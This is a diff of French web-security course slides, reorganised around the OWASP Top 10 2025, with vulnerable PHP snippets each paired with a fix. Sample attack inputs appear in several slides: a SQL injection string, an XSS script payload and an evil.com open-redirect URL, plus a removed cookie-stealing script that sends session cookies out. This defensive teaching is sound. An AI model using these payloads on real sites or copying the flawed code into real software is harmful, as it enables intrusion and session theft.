@@ -344,7 +344,6 @@ Conception d'une application sans prise en compte de la sécurité.
 - Données en clair.
 - Manque de contrôle d'accès.
 - Manque de contrôle de saisie.
-- Manque de contrôle de type (XSS, CSRF).
 - Absence d'anti-bots (captcha).
 - Utilisation d'une question secrète.
 - Réservation de place sans acompte.
@@ -404,7 +403,6 @@ Cette catégorie englobe les codes et infrastructures qui ne sont pas protégés
 
 - Absence de vérification de l'intégrité des données (validation d'une mise à jour).
 - Absence de vérification de l'intégrité du logiciel (signature, hashage, etc).
-- Rejeu de requêtes possible (absence de CSRF).
 
 ---
 
@@ -495,55 +493,6 @@ Les gens sont souvent trop confiants.
 
 ---
 
-Un instant ✋
-
----
-
-🔐 L'authentification 🔐
-
----
-
-Crypter ≠ Hasher
-
----
-
-Quelle est la différence ?
-
----
-
-- Crypter => Réversible (comme Canal+).
-- Hasher => Non réversible (comme le steak haché).
-
----
-
-## L'authentification forte
-
-- MFA (Multi-Factor Authentication)
-- 2FA (Two-Factor Authentication)
-- OTP (One-Time Password)
-
----
-
-## 3 formes d'authentification
-
-- **Mémorielle** qui représente une chose que l'intéressé connaît (un secret),
-- **Matérielle** qui se réfère à quelque chose qu'il possède (un objet),
-- **Corporelle** qui utilise un trait physique de l'utilisateur (une biométrie).
-
-## Des outils
-
-- Mot de passe : Un mot de passe avec un niveau de sécurité suffisant (longueur, caractères spéciaux, majuscules, minuscules, chiffres).
-- Application : OTP (One Time Password) : SMS, Google Authenticator, Authy, Yubikey.
-- Objet physique : U2F (Universal 2nd Factor) : Clé USB, Yubikey.
-- Biométrie : Empreinte digitale, Reconnaissance faciale.
-
----
-
-- Permet de sécuriser les mots de passe en ajoutant **une couche de sécurité supplémentaire**.
-- Via un secret partagé entre la personne **physique** et le site/application.
-
----
-
 ### Supply Chain Attacks
 
 #### Attaque ciblant les dépendances logicielles
@@ -563,6 +512,14 @@ Les dépendances logicielles sont partout dans nos applications (nuget, composer
 
 ---
 
+### OWASP un classement qui évolue
+
+![Mapping 2021 -> 2025](./img/mapping-2025.png)
+
+[Source](https://owasp.org/Top10/2025/)
+
+---
+
 ### On connait les failles
 
 #### Comment on les corrige ?
@@ -575,14 +532,13 @@ OWASP donne la liste des grandes catégories de failles. Entrons dans le détail
 
 ---
 
-### L'Injection
+### A01 : Contrôles d'accès défaillants
 
-```sql
-SELECT * FROM client WHERE id='" . $_GET["id"] . "'
-```
-
-```html
-http://exemple.com/liste?id='or '1'='1
+```php
+// http://exemple.com/facture.php?id=42
+// Et si je remplace 42 par 43 ?
+$stmt = $pdo->prepare("SELECT * FROM facture WHERE id = ?");
+$stmt->execute([$_GET["id"]]);
 ```
 
 ---
@@ -590,46 +546,160 @@ http://exemple.com/liste?id='or '1'='1
 ### Correction
 
 ```php
-$stmt = $pdo->prepare("SELECT * FROM client WHERE id=?");
-$stmt->bindParam(1, $_GET["id"]);
-$stmt->execute();
+// La facture doit appartenir à l'utilisateur connecté
+$stmt = $pdo->prepare("SELECT * FROM facture WHERE id = ? AND client_id = ?");
+$stmt->execute([$_GET["id"], $_SESSION["client_id"]]);
 ```
 
 ---
 
-### Accès non autorisé à une session
+### A01 : Falsification de requête intersite (CSRF)
 
 ```html
-http://exemple.com/?jsessionid=A2938298D293
+<!-- Un site tiers peut envoyer le même formulaire -->
+<form method="post" action="supprimer-compte.php">
+    <button>Supprimer mon compte</button>
+</form>
 ```
 
 ---
 
-Vol du cookie de session
+### Correction
 
-```javascript
-// Exemple de vol d'un cookie de session en JavaScript
-var img = new Image();
-img.src = "http://exemple.com/?jsessionid=" + document.cookie;
-document.body.appendChild(img);
+```php
+// Génération (à l'affichage du formulaire)
+$_SESSION['token'] = bin2hex(random_bytes(32));
 ```
-
----
-
-### Cross-Site Scripting (XSS)
-
-Exécution de code JavaScript sans validation.
-
-- XSS Stocké (base de données).
-- XSS Réfléchi (URL / Lien).
-
----
 
 ```html
-Votre Nom : <input type="text" name="nom" value="" />
+<input type="hidden" name="token" value="<?= $_SESSION['token'] ?>">
 ```
 
 ```php
+// Vérification (à la réception du formulaire)
+if (!hash_equals($_SESSION['token'], $_POST['token'] ?? '')) {
+    die("Requête invalide.");
+}
+```
+
+---
+
+### A01 : Redirections non validées
+
+```php
+// http://www.shop-vdt.com/login.php?goto=evil.com/login
+header("Location: " . $_GET['goto']);
+```
+
+[En vidéo](https://www.youtube.com/watch?v=ibFs8FZxzu4)
+
+---
+
+### Correction
+
+```php
+// Uniquement des destinations connues
+$whitelist = ['accueil', 'compte', 'panier'];
+
+if (in_array($_GET['goto'], $whitelist)) {
+    header("Location: index.php?page=" . $_GET['goto']);
+}
+```
+
+---
+
+### A02 : Mauvaise configuration de sécurité
+
+```apache
+# Apache : la liste des fichiers est visible par tous
+Options +Indexes
+```
+
+```ini
+; PHP : les erreurs détaillées sont affichées aux visiteurs
+display_errors = On
+```
+
+---
+
+### Correction
+
+```apache
+Options -Indexes
+```
+
+```ini
+display_errors = Off
+log_errors = On
+```
+
+---
+
+### A03 : Chaîne d'approvisionnement logicielle
+
+```bash
+# composer.lock ignoré, dernières versions installées sans contrôle
+composer update
+```
+
+---
+
+### Correction
+
+```bash
+# composer.lock versionné : les mêmes versions partout
+composer install
+
+# Recherche des vulnérabilités connues
+composer audit
+```
+
+---
+
+### A04 : Défaillances cryptographiques
+
+```php
+// MD5 est beaucoup trop rapide à casser
+$hash = md5($_POST['password']);
+```
+
+---
+
+### Correction
+
+```php
+// À l'inscription
+$hash = password_hash($_POST['password'], PASSWORD_DEFAULT);
+
+// À la connexion
+password_verify($_POST['password'], $hash);
+```
+
+---
+
+### A05 : Injection SQL
+
+```php
+// http://exemple.com/liste?id=' OR '1'='1
+$sql = "SELECT * FROM client WHERE id='" . $_GET["id"] . "'";
+$result = $pdo->query($sql);
+```
+
+---
+
+### Correction
+
+```php
+$stmt = $pdo->prepare("SELECT * FROM client WHERE id = ?");
+$stmt->execute([$_GET["id"]]);
+```
+
+---
+
+### A05 : Cross-Site Scripting (XSS)
+
+```php
+// nom = <script>alert('XSS')</script>
 echo "Bonjour " . $_POST['nom'];
 ```
 
@@ -638,174 +708,126 @@ echo "Bonjour " . $_POST['nom'];
 ### Correction
 
 ```php
-$nom = filter_input(INPUT_POST, 'nom', FILTER_SANITIZE_FULL_SPECIAL_CHARS);
-// ou
-$nom = strip_tags($_POST['nom']);
-// ou (recommandé pour l'affichage)
-$nom = htmlspecialchars($_POST['nom'], ENT_QUOTES, 'UTF-8');
+echo "Bonjour " . htmlspecialchars($_POST['nom'], ENT_QUOTES, 'UTF-8');
 ```
-
 
 ---
 
-### A4 - Références directes non sécurisées à un objet
-
-```
-http://exemple.com/liste?mode=client
-```
-
-Si je change client par … admin ?
-
----
-
-```sql
-SELECT * FROM client where mode=?
-```
+### A06 : Conception non sécurisée
 
 ```php
-$stmt->bindParam(1, $mode);
-```
-
----
-
-- Toujours valider les entrées utilisateurs.
-- Toujours vérifier les droits de l'utilisateur.
-
-```php
-if ($_SESSION['mode'] == 'client') {
-    // On peut charger la ressource
-} else if ($_SESSION['mode'] == 'admin') {
-    // On peut charger la ressource
-} else {
-    // On ne peut pas charger la ressource
+// Peu de réponses possibles : facile à deviner
+if ($_POST['reponse'] == $user['couleur_preferee']) {
+    resetPassword($user);
 }
 ```
 
 ---
 
-### Mauvaise configuration Sécurité
-
-- Console d’administration disponible sans authentification en ligne
-- Listage des répertoires ([Exemple](https://www.google.fr/search?dcr=0&q=intitle%3A%22Index%20of%22))
-- Exemples de code non supprimés
-
----
-
-### Exposition de données sensibles
-
-- Espace client sans SSL/TLS.
-- Mot de passe en clair (**ou en MD5, SHA1**) dans la base de données.
-- Sauvegarde de données inutiles.
-- Données sensibles dans les logs.
-- Données sensibles en clair dans la base de données.
-- Absence de chiffrement des données au repos.
-
----
-
-- Utilisation de HTTPS (SSL/TLS).
+### Correction
 
 ```php
-password_hash('admin', PASSWORD_DEFAULT);
-password_verify('admin', $hash);
+// Un lien unique et temporaire, envoyé par mail
+$token = bin2hex(random_bytes(32));
+saveResetToken($user, hash('sha256', $token), time() + 3600);
+sendResetMail($user, $token);
 ```
 
 ---
 
-### Manque de contrôle d’accès au niveau fonctionnel
-
-- Page d’admin accessible avec un compte utilisateur
-- Mode non filtré (similaire à l’exemple mode={client,admin})
-
----
-
-Condition d'accès dans le code
+### A07 : Défaillances d'authentification
 
 ```php
-if(SessionUtilisateur::estAdmin()) {
-    // On peut charger la ressource
-} else {
-    // On ne peut pas charger la ressource
+// Aucune limite : des milliers d'essais possibles
+if (password_verify($_POST['password'], $user['password'])) {
+    $_SESSION['user_id'] = $user['id'];
 }
 ```
 
 ---
 
-### Falsification de requête intersite (CSRF)
-
-- Rejeu de requête déjà jouée.
-- Attaque de type brute force.
-- Exécution de requête à l’insu de l’utilisateur (exemple : déconnexion / connexion sur un site tiers).
-
----
-
-#### Comment le bloquer ?
-
-Ajoutez un identifiant/jeton dans la requête, unique et non réutilisable
-
-⚠️ Parlons-en !
-
----
-
-Ajouter un jeton unique dans les formulaires.
+### Correction
 
 ```php
-<input type="hidden" name="_token" value="{{ csrf_token() }}">
+if (tooManyAttempts($user)) {
+    die("Compte temporairement bloqué.");
+}
 
-// Côté PHP
-if (isset($_POST['_token']) && $_POST['_token'] == $_SESSION['_token']) {
-    // On peut traiter la requête
-} else {
-    die();
+if (password_verify($_POST['password'], $user['password'])) {
+    session_regenerate_id(true); // Nouvel identifiant de session
+    $_SESSION['user_id'] = $user['id'];
 }
 ```
 
 ---
 
-### Utilisation de composants avec des vulnérabilités connues
-
-- CMS non à jour.
-- Apache non patché.
-- Librairies XYZ non à jour.
-- PHP non à jour.
-- MySQL non à jour.
-
----
-
-### Mauvaise conception
-
-- Absence d'anti-bots.
-
-Utilisation de captcha (Google Recaptcha par exemple).
+### A08 : Manque d'intégrité des données et du logiciel
 
 ```html
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
-<div class="g-recaptcha" data-sitekey="your_site_key"></div>
+<!-- Et si le fichier est modifié sur le CDN ? -->
+<script src="https://cdn.exemple.com/lib.js"></script>
+```
 
-// Côté PHP
-if (isset($_POST['g-recaptcha-response'])) {
-    // On peut traiter la requête
-} else {
-    die();
+---
+
+### Correction
+
+```html
+<!-- Le navigateur vérifie l'empreinte du fichier -->
+<script src="https://cdn.exemple.com/lib.js"
+        integrity="sha384-..."
+        crossorigin="anonymous"></script>
+```
+
+---
+
+### A09 : Carence de journalisation et d'alerte
+
+```php
+if (!password_verify($_POST['password'], $user['password'])) {
+    // Personne n'est au courant de la tentative
+    return false;
 }
 ```
 
 ---
 
-Utilisation d'une question secrète :
+### Correction
 
-- Car faible possibilité de réponse (peu de couleurs, peu de réponses possibles, peu de dates, etc).
+```php
+if (!password_verify($_POST['password'], $user['password'])) {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    error_log("Échec de connexion : compte {$user['id']}, IP $ip");
+    return false;
+}
+```
 
 ---
 
-### Redirections et Renvois non validés
+### A10 : Mauvaise gestion des conditions exceptionnelles
 
-- Utilisation de votre site comme « masque » dans du phishing
-
+```php
+try {
+    $isAdmin = checkAdmin($user);
+} catch (Exception $e) {
+    // Une erreur et tout le monde devient admin
+    $isAdmin = true;
+}
 ```
-http://www.shop-vdt.com/login.php?goto=evil.com/login
-```
 
-[En vidéo](https://www.youtube.com/watch?v=ibFs8FZxzu4)
+---
+
+### Correction
+
+```php
+try {
+    $isAdmin = checkAdmin($user);
+} catch (Exception $e) {
+    // En cas d'erreur, on refuse l'accès
+    error_log($e->getMessage());
+    $isAdmin = false;
+}
+```
 
 ---
 
@@ -955,11 +977,24 @@ gitleaks protect --staged
 
 ---
 
-### OWASP un classement qui évolue
+Un instant ✋
 
-![Mapping 2021 -> 2025](./img/mapping-2025.png)
+---
 
-[Source](https://owasp.org/Top10/2025/)
+🔐 L'authentification 🔐
+
+---
+
+Crypter ≠ Hasher
+
+---
+
+Quelle est la différence ?
+
+---
+
+- Crypter => Réversible (comme Canal+).
+- Hasher => Non réversible (comme le steak haché).
 
 ---
 
@@ -980,8 +1015,9 @@ gitleaks protect --staged
 
 ## Le sel
 
-- Peut être différent pour chaque utilisateur.
-- Peut être global pour tous les utilisateurs.
+- Unique pour chaque utilisateur.
+- Stocké avec le hash.
+- Deux mots de passe identiques donnent deux hash différents.
 
 ---
 
@@ -1008,6 +1044,14 @@ gitleaks protect --staged
     Le bcrypt est un algorithme de hachage qui intègre le sel, le coût et utilise Blowfish. Argon2 est recommandé comme alternative moderne (gagnant du Password Hashing Competition 2015).
   </p>
 </fieldset>
+
+---
+
+## L'authentification forte
+
+- MFA (Multi-Factor Authentication)
+- 2FA (Two-Factor Authentication)
+- OTP (One-Time Password)
 
 ---
 
